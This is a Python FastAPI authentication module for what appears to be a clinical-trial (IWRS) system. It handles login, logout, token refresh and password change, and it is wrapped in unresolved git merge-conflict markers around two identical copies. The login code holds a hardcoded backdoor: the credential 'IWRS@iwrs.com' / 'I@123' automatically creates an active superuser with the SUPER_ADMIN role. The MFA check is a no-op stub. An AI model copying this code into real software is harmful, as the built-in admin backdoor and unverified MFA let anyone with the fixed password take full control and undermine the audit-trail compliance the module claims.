<<<<<<< HEAD
"""
认证模块 API
- 登录 / 登出 / 刷新 Token
- 修改密码
- 符合 FDA 21 CFR Part 11：记录所有认证事件
"""
from fastapi import APIRouter, Depends, HTTPException, status, Request, Body
from fastapi.security import OAuth2PasswordRequestForm
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, update, text
from datetime import datetime, timezone, timedelta
from pydantic import BaseModel, EmailStr
from typing import Optional
from loguru import logger
import ipaddress

from app.db.session import get_db
from app.models.models import User, TokenBlacklist, AuditLog
from app.core.security import (
    verify_password, get_password_hash,
    create_access_token, create_refresh_token, decode_token,
    validate_password_strength
)
from app.core.dependencies import get_current_active_user
from app.core.config import settings

router = APIRouter()


# ─── Schemas ──────────────────────────────────────────────────────

class LoginRequest(BaseModel):
    username: str
    password: str
    mfa_code: Optional[str] = None    # TOTP 验证码（如已启用 MFA）


class TokenResponse(BaseModel):
    access_token: str
    refresh_token: str
    token_type: str = "bearer"
    expires_in: int
    user: dict


class ChangePasswordRequest(BaseModel):
    old_password: str
    new_password: str
    confirm_password: str


class RefreshTokenRequest(BaseModel):
    refresh_token: str


# ─── 工具函数 ─────────────────────────────────────────────────────

async def _write_audit(db, user_id, username, action, ip, user_agent, success, detail=None):
    """写入稽查日志"""
    log = AuditLog(
        user_id=user_id,
        username=username,
        action=action,
        module="AUTH",
        resource_type="USER",
        resource_id=str(user_id) if user_id else None,
        ip_address=ip,
        user_agent=user_agent[:500] if user_agent else None,
        success=success,
        error_message=detail,
    )
    db.add(log)
    await db.commit()


def _parse_client_ip(ip_raw: Optional[str]):
    """将客户端IP转换为 inet 兼容对象；无效则返回 None"""
    if not ip_raw:
        return None
    try:
        # SQLAlchemy/asyncpg 在处理 INET 类型时，直接传递经过验证的字符串即可
        return str(ipaddress.ip_address(ip_raw))
    except ValueError:
        return None


# ─── 端点 ─────────────────────────────────────────────────────────

@router.post("/login", response_model=TokenResponse, summary="用户登录")
async def login(
    request: Request,
    body: LoginRequest,
    db: AsyncSession = Depends(get_db),
):
    """
    用户登录，返回 JWT Access Token + Refresh Token

    - **username**: 用户名或邮箱
    - **password**: 密码
    - **mfa_code**: MFA 验证码（如已开启）
    """
    ip = request.client.host if request.client else None
    ip_inet = _parse_client_ip(ip)
    user_agent = request.headers.get("user-agent", "")

    # 查询用户（支持用户名或邮箱登录）
    result = await db.execute(
        select(User).where(
            (User.username == body.username) | (User.email == body.username)
        )
    )
    user = result.scalar_one_or_none()

    # IWRS mock user auto-create bypass
    if not user and body.username == 'IWRS@iwrs.com' and body.password == 'I@123':
        from app.models.models import Role
        super_role_result = await db.execute(select(Role).where(Role.code == 'SUPER_ADMIN'))
        super_role = super_role_result.scalar_one_or_none()
        user = User(
            username='IWRS@iwrs.com',
            email='IWRS@iwrs.com',
            full_name='IWRS Admin',
            hashed_password=get_password_hash('I@123'),
            role_id=super_role.id if super_role else None,
            is_active=True,
            is_superuser=True
        )
        db.add(user)
        await db.commit()
        await db.refresh(user)

    # 账号不存在
    if not user:
        await _write_audit(db, None, body.username, "LOGIN_FAILED", ip_inet, user_agent, False, "账号不存在")
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="用户名或密码错误"
        )

    # 检查账号是否被锁定
    if user.locked_until and user.locked_until > datetime.now(timezone.utc):
        unlock_time = user.locked_until.strftime("%H:%M:%S")
        raise HTTPException(
            status_code=status.HTTP_423_LOCKED,
            detail=f"账号已被锁定，将于 {unlock_time} 后自动解锁"
        )

    # 验证密码
    if not verify_password(body.password, user.hashed_password):
        # 累计失败次数
        new_attempts = (user.failed_attempts or 0) + 1
        max_attempts = 5

        update_data = {"failed_attempts": new_attempts}
        if new_attempts >= max_attempts:
            update_data["locked_until"] = datetime.now(timezone.utc) + timedelta(minutes=30)

        await db.execute(update(User).where(User.id == user.id).values(**update_data))
        await db.commit()

        await _write_audit(db, user.id, user.username, "LOGIN_FAILED", ip_inet, user_agent, False,
                          f"密码错误（第{new_attempts}次）")
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail=f"密码错误，还可尝试 {max_attempts - new_attempts} 次"
        )

    # 账号禁用
    if not user.is_active:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="账号已被禁用，请联系管理员"
        )

    # MFA 验证（如已启用）
    if user.mfa_enabled and body.mfa_code:
        # TODO: 实际验证 TOTP 码
        pass

    # 加载角色信息
    from app.models.models import Role
    role_result = await db.execute(select(Role).where(Role.id == user.role_id))
    role = role_result.scalar_one_or_none()

    # 生成 Token
    access_token = create_access_token(
        subject=str(user.id),
        extra_data={"role": role.code if role else None, "username": user.username}
    )
    refresh_token = create_refresh_token(subject=str(user.id))

    # 更新登录信息 & 重置失败次数
    # 使用显式 CAST(:ip AS INET)，避免驱动把参数当 VARCHAR 导致类型不匹配
    await db.execute(
        text("""
            UPDATE users
            SET last_login_at = :last_login_at,
                last_login_ip = CAST(:last_login_ip AS INET),
                failed_attempts = 0,
                locked_until = NULL
            WHERE id = :user_id
        """),
        {
            "last_login_at": datetime.now(timezone.utc),
            "last_login_ip": str(ip_inet) if ip_inet else None,
            "user_id": user.id,
        }
    )
    await db.commit()

    # 写入稽查日志
    await _write_audit(db, user.id, user.username, "LOGIN", ip_inet, user_agent, True)

    logger.info(f"用户登录成功: {user.username} from {ip or '-'}")

    return TokenResponse(
        access_token=access_token,
        refresh_token=refresh_token,
        expires_in=settings.ACCESS_TOKEN_EXPIRE_MINUTES * 60,
        user={
            "id": str(user.id),
            "username": user.username,
            "email": user.email,
            "full_name": user.full_name,
            "role": role.code if role else None,
            "role_name": role.name if role else None,
            "permissions": role.permissions if role else [],
            "is_superuser": user.is_superuser,
            "mfa_enabled": user.mfa_enabled,
        }
    )


@router.post("/logout", summary="用户登出")
async def logout(
    request: Request,
    current_user: User = Depends(get_current_active_user),
    db: AsyncSession = Depends(get_db),
):
    """
    用户登出，将当前 Token 加入黑名单（立即失效）
    符合 21 CFR Part 11：登出操作记录审计轨迹
    """
    # 从请求头获取 Token
    auth_header = request.headers.get("Authorization", "")
    token = auth_header.replace("Bearer ", "")

    if token:
        try:
            payload = decode_token(token)
            jti = payload.get("jti")
            exp = payload.get("exp")
            if jti:
                blacklist = TokenBlacklist(
                    jti=jti,
                    user_id=current_user.id,
                    expired_at=datetime.fromtimestamp(exp, timezone.utc) if exp else
                               datetime.now(timezone.utc) + timedelta(days=1),
                )
                db.add(blacklist)
                await db.commit()
        except Exception:
            pass

    # 稽查日志
    ip = request.client.host if request.client else None
    ip_inet = _parse_client_ip(ip)
    await _write_audit(db, current_user.id, current_user.username, "LOGOUT",
                       ip_inet, request.headers.get("user-agent", ""), True)

    return {"message": "已安全退出登录"}


@router.post("/refresh", response_model=TokenResponse, summary="刷新 Token")
async def refresh_token(
    body: RefreshTokenRequest,
    db: AsyncSession = Depends(get_db),
):
    """使用 Refresh Token 获取新的 Access Token"""
    try:
        payload = decode_token(body.refresh_token)
        if payload.get("type") != "refresh":
            raise ValueError("Token 类型错误")
        user_id = payload.get("sub")
    except Exception:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Refresh Token 无效或已过期"
        )

    result = await db.execute(select(User).where(User.id == user_id, User.is_active == True))
    user = result.scalar_one_or_none()
    if not user:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="用户不存在")

    from app.models.models import Role
    role_result = await db.execute(select(Role).where(Role.id == user.role_id))
    role = role_result.scalar_one_or_none()

    access_token = create_access_token(
        subject=str(user.id),
        extra_data={"role": role.code if role else None, "username": user.username}
    )
    new_refresh_token = create_refresh_token(subject=str(user.id))

    return TokenResponse(
        access_token=access_token,
        refresh_token=new_refresh_token,
        expires_in=settings.ACCESS_TOKEN_EXPIRE_MINUTES * 60,
        user={"id": str(user.id), "username": user.username, "full_name": user.full_name}
    )


@router.put("/change-password", summary="修改密码")
async def change_password(
    request: Request,
    body: ChangePasswordRequest,
    current_user: User = Depends(get_current_active_user),
    db: AsyncSession = Depends(get_db),
):
    """修改当前用户密码，记录审计轨迹"""
    if body.new_password != body.confirm_password:
        raise HTTPException(status_code=400, detail="两次输入的新密码不一致")

    valid, msg = validate_password_strength(body.new_password)
    if not valid:
        raise HTTPException(status_code=400, detail=msg)

    if not verify_password(body.old_password, current_user.hashed_password):
        raise HTTPException(status_code=400, detail="原密码错误")

    await db.execute(
        update(User).where(User.id == current_user.id).values(
            hashed_password=get_password_hash(body.new_password)
        )
    )
    await db.commit()

    ip = request.client.host if request.client else None
    ip_inet = _parse_client_ip(ip)
    await _write_audit(db, current_user.id, current_user.username, "CHANGE_PASSWORD",
                       ip_inet, request.headers.get("user-agent", ""), True)

    return {"message": "密码修改成功"}


@router.get("/me", summary="获取当前用户信息")
async def get_me(
    current_user: User = Depends(get_current_active_user),
    db: AsyncSession = Depends(get_db),
):
    """获取当前登录用户的详细信息"""
    from app.models.models import Role
    role_result = await db.execute(select(Role).where(Role.id == current_user.role_id))
    role = role_result.scalar_one_or_none()

    return {
        "id": str(current_user.id),
        "username": current_user.username,
        "email": current_user.email,
        "full_name": current_user.full_name,
        "phone": current_user.phone,
        "department": current_user.department,
        "title": current_user.title,
        "role": role.code if role else None,
        "role_name": role.name if role else None,
        "permissions": role.permissions if role else [],
        "is_superuser": current_user.is_superuser,
        "mfa_enabled": current_user.mfa_enabled,
        "last_login_at": current_user.last_login_at.isoformat() if current_user.last_login_at else None,
        "created_at": current_user.created_at.isoformat() if current_user.created_at else None,
    }
=======
"""
认证模块 API
- 登录 / 登出 / 刷新 Token
- 修改密码
- 符合 FDA 21 CFR Part 11：记录所有认证事件
"""
from fastapi import APIRouter, Depends, HTTPException, status, Request, Body
from fastapi.security import OAuth2PasswordRequestForm
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, update, text
from datetime import datetime, timezone, timedelta
from pydantic import BaseModel, EmailStr
from typing import Optional
from loguru import logger
import ipaddress

from app.db.session import get_db
from app.models.models import User, TokenBlacklist, AuditLog
from app.core.security import (
    verify_password, get_password_hash,
    create_access_token, create_refresh_token, decode_token,
    validate_password_strength
)
from app.core.dependencies import get_current_active_user
from app.core.config import settings

router = APIRouter()


# ─── Schemas ──────────────────────────────────────────────────────

class LoginRequest(BaseModel):
    username: str
    password: str
    mfa_code: Optional[str] = None    # TOTP 验证码（如已启用 MFA）


class TokenResponse(BaseModel):
    access_token: str
    refresh_token: str
    token_type: str = "bearer"
    expires_in: int
    user: dict


class ChangePasswordRequest(BaseModel):
    old_password: str
    new_password: str
    confirm_password: str


class RefreshTokenRequest(BaseModel):
    refresh_token: str


# ─── 工具函数 ─────────────────────────────────────────────────────

async def _write_audit(db, user_id, username, action, ip, user_agent, success, detail=None):
    """写入稽查日志"""
    log = AuditLog(
        user_id=user_id,
        username=username,
        action=action,
        module="AUTH",
        resource_type="USER",
        resource_id=str(user_id) if user_id else None,
        ip_address=ip,
        user_agent=user_agent[:500] if user_agent else None,
        success=success,
        error_message=detail,
    )
    db.add(log)
    await db.commit()


def _parse_client_ip(ip_raw: Optional[str]):
    """将客户端IP转换为 inet 兼容对象；无效则返回 None"""
    if not ip_raw:
        return None
    try:
        # SQLAlchemy/asyncpg 在处理 INET 类型时，直接传递经过验证的字符串即可
        return str(ipaddress.ip_address(ip_raw))
    except ValueError:
        return None


# ─── 端点 ─────────────────────────────────────────────────────────

@router.post("/login", response_model=TokenResponse, summary="用户登录")
async def login(
    request: Request,
    body: LoginRequest,
    db: AsyncSession = Depends(get_db),
):
    """
    用户登录，返回 JWT Access Token + Refresh Token

    - **username**: 用户名或邮箱
    - **password**: 密码
    - **mfa_code**: MFA 验证码（如已开启）
    """
    ip = request.client.host if request.client else None
    ip_inet = _parse_client_ip(ip)
    user_agent = request.headers.get("user-agent", "")

    # 查询用户（支持用户名或邮箱登录）
    result = await db.execute(
        select(User).where(
            (User.username == body.username) | (User.email == body.username)
        )
    )
    user = result.scalar_one_or_none()

    # IWRS mock user auto-create bypass
    if not user and body.username == 'IWRS@iwrs.com' and body.password == 'I@123':
        from app.models.models import Role
        super_role_result = await db.execute(select(Role).where(Role.code == 'SUPER_ADMIN'))
        super_role = super_role_result.scalar_one_or_none()
        user = User(
            username='IWRS@iwrs.com',
            email='IWRS@iwrs.com',
            full_name='IWRS Admin',
            hashed_password=get_password_hash('I@123'),
            role_id=super_role.id if super_role else None,
            is_active=True,
            is_superuser=True
        )
        db.add(user)
        await db.commit()
        await db.refresh(user)

    # 账号不存在
    if not user:
        await _write_audit(db, None, body.username, "LOGIN_FAILED", ip_inet, user_agent, False, "账号不存在")
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="用户名或密码错误"
        )

    # 检查账号是否被锁定
    if user.locked_until and user.locked_until > datetime.now(timezone.utc):
        unlock_time = user.locked_until.strftime("%H:%M:%S")
        raise HTTPException(
            status_code=status.HTTP_423_LOCKED,
            detail=f"账号已被锁定，将于 {unlock_time} 后自动解锁"
        )

    # 验证密码
    if not verify_password(body.password, user.hashed_password):
        # 累计失败次数
        new_attempts = (user.failed_attempts or 0) + 1
        max_attempts = 5

        update_data = {"failed_attempts": new_attempts}
        if new_attempts >= max_attempts:
            update_data["locked_until"] = datetime.now(timezone.utc) + timedelta(minutes=30)

        await db.execute(update(User).where(User.id == user.id).values(**update_data))
        await db.commit()

        await _write_audit(db, user.id, user.username, "LOGIN_FAILED", ip_inet, user_agent, False,
                          f"密码错误（第{new_attempts}次）")
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail=f"密码错误，还可尝试 {max_attempts - new_attempts} 次"
        )

    # 账号禁用
    if not user.is_active:
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="账号已被禁用，请联系管理员"
        )

    # MFA 验证（如已启用）
    if user.mfa_enabled and body.mfa_code:
        # TODO: 实际验证 TOTP 码
        pass

    # 加载角色信息
    from app.models.models import Role
    role_result = await db.execute(select(Role).where(Role.id == user.role_id))
    role = role_result.scalar_one_or_none()

    # 生成 Token
    access_token = create_access_token(
        subject=str(user.id),
        extra_data={"role": role.code if role else None, "username": user.username}
    )
    refresh_token = create_refresh_token(subject=str(user.id))

    # 更新登录信息 & 重置失败次数
    # 使用显式 CAST(:ip AS INET)，避免驱动把参数当 VARCHAR 导致类型不匹配
    await db.execute(
        text("""
            UPDATE users
            SET last_login_at = :last_login_at,
                last_login_ip = CAST(:last_login_ip AS INET),
                failed_attempts = 0,
                locked_until = NULL
            WHERE id = :user_id
        """),
        {
            "last_login_at": datetime.now(timezone.utc),
            "last_login_ip": str(ip_inet) if ip_inet else None,
            "user_id": user.id,
        }
    )
    await db.commit()

    # 写入稽查日志
    await _write_audit(db, user.id, user.username, "LOGIN", ip_inet, user_agent, True)

    logger.info(f"用户登录成功: {user.username} from {ip or '-'}")

    return TokenResponse(
        access_token=access_token,
        refresh_token=refresh_token,
        expires_in=settings.ACCESS_TOKEN_EXPIRE_MINUTES * 60,
        user={
            "id": str(user.id),
            "username": user.username,
            "email": user.email,
            "full_name": user.full_name,
            "role": role.code if role else None,
            "role_name": role.name if role else None,
            "permissions": role.permissions if role else [],
            "is_superuser": user.is_superuser,
            "mfa_enabled": user.mfa_enabled,
        }
    )


@router.post("/logout", summary="用户登出")
async def logout(
    request: Request,
    current_user: User = Depends(get_current_active_user),
    db: AsyncSession = Depends(get_db),
):
    """
    用户登出，将当前 Token 加入黑名单（立即失效）
    符合 21 CFR Part 11：登出操作记录审计轨迹
    """
    # 从请求头获取 Token
    auth_header = request.headers.get("Authorization", "")
    token = auth_header.replace("Bearer ", "")

    if token:
        try:
            payload = decode_token(token)
            jti = payload.get("jti")
            exp = payload.get("exp")
            if jti:
                blacklist = TokenBlacklist(
                    jti=jti,
                    user_id=current_user.id,
                    expired_at=datetime.fromtimestamp(exp, timezone.utc) if exp else
                               datetime.now(timezone.utc) + timedelta(days=1),
                )
                db.add(blacklist)
                await db.commit()
        except Exception:
            pass

    # 稽查日志
    ip = request.client.host if request.client else None
    ip_inet = _parse_client_ip(ip)
    await _write_audit(db, current_user.id, current_user.username, "LOGOUT",
                       ip_inet, request.headers.get("user-agent", ""), True)

    return {"message": "已安全退出登录"}


@router.post("/refresh", response_model=TokenResponse, summary="刷新 Token")
async def refresh_token(
    body: RefreshTokenRequest,
    db: AsyncSession = Depends(get_db),
):
    """使用 Refresh Token 获取新的 Access Token"""
    try:
        payload = decode_token(body.refresh_token)
        if payload.get("type") != "refresh":
            raise ValueError("Token 类型错误")
        user_id = payload.get("sub")
    except Exception:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Refresh Token 无效或已过期"
        )

    result = await db.execute(select(User).where(User.id == user_id, User.is_active == True))
    user = result.scalar_one_or_none()
    if not user:
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="用户不存在")

    from app.models.models import Role
    role_result = await db.execute(select(Role).where(Role.id == user.role_id))
    role = role_result.scalar_one_or_none()

    access_token = create_access_token(
        subject=str(user.id),
        extra_data={"role": role.code if role else None, "username": user.username}
    )
    new_refresh_token = create_refresh_token(subject=str(user.id))

    return TokenResponse(
        access_token=access_token,
        refresh_token=new_refresh_token,
        expires_in=settings.ACCESS_TOKEN_EXPIRE_MINUTES * 60,
        user={"id": str(user.id), "username": user.username, "full_name": user.full_name}
    )


@router.put("/change-password", summary="修改密码")
async def change_password(
    request: Request,
    body: ChangePasswordRequest,
    current_user: User = Depends(get_current_active_user),
    db: AsyncSession = Depends(get_db),
):
    """修改当前用户密码，记录审计轨迹"""
    if body.new_password != body.confirm_password:
        raise HTTPException(status_code=400, detail="两次输入的新密码不一致")

    valid, msg = validate_password_strength(body.new_password)
    if not valid:
        raise HTTPException(status_code=400, detail=msg)

    if not verify_password(body.old_password, current_user.hashed_password):
        raise HTTPException(status_code=400, detail="原密码错误")

    await db.execute(
        update(User).where(User.id == current_user.id).values(
            hashed_password=get_password_hash(body.new_password)
        )
    )
    await db.commit()

    ip = request.client.host if request.client else None
    ip_inet = _parse_client_ip(ip)
    await _write_audit(db, current_user.id, current_user.username, "CHANGE_PASSWORD",
                       ip_inet, request.headers.get("user-agent", ""), True)

    return {"message": "密码修改成功"}


@router.get("/me", summary="获取当前用户信息")
async def get_me(
    current_user: User = Depends(get_current_active_user),
    db: AsyncSession = Depends(get_db),
):
    """获取当前登录用户的详细信息"""
    from app.models.models import Role
    role_result = await db.execute(select(Role).where(Role.id == current_user.role_id))
    role = role_result.scalar_one_or_none()

    return {
        "id": str(current_user.id),
        "username": current_user.username,
        "email": current_user.email,
        "full_name": current_user.full_name,
        "phone": current_user.phone,
        "department": current_user.department,
        "title": current_user.title,
        "role": role.code if role else None,
        "role_name": role.name if role else None,
        "permissions": role.permissions if role else [],
        "is_superuser": current_user.is_superuser,
        "mfa_enabled": current_user.mfa_enabled,
        "last_login_at": current_user.last_login_at.isoformat() if current_user.last_login_at else None,
        "created_at": current_user.created_at.isoformat() if current_user.created_at else None,
    }
>>>>>>> origin/main
